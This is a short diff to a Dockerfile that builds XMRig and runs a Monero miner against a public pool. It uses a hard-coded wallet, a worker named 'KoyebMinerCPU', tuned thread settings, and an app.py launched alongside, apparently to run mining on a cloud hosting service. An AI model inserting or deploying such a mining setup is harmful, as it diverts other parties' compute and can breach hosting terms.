@@ -36,6 +36,6 @@ RUN git clone https://github.com/xmrig/xmrig.git xmrig-cpu \
 WORKDIR /Tetroku/xmrig-cpu/build
 COPY app.py .
 
-# Запускаем один майнер с оптимизированными настройками
-CMD ./xmrig --url de.monero.herominers.com:1111 --user 4AsybUjHWc3LtcJj7h7yd9NJ3JXQynQUneMTpoTALYgmSFNW6XLmYGGLR5rHr3zcfjbPZ6dHp9MSdLiDBAXd4wKQ5ufR6vv.KoyebMinerCPU --pass x --threads 16 --cpu-max-threads-hint 80 --cpu-priority 5 --randomx-1gb-pages & \
+# Запускаем один майнер с --randomx-mode=fast
+CMD ./xmrig --url de.monero.herominers.com:1111 --user 4AsybUjHWc3LtcJj7h7yd9NJ3JXQynQUneMTpoTALYgmSFNW6XLmYGGLR5rHr3zcfjbPZ6dHp9MSdLiDBAXd4wKQ5ufR6vv.KoyebMinerCPU --pass x --threads 8 --cpu-max-threads-hint 80 --randomx-1gb-pages --randomx-mode=fast --http-enabled --http-port 8080 & \
     python3 app.py
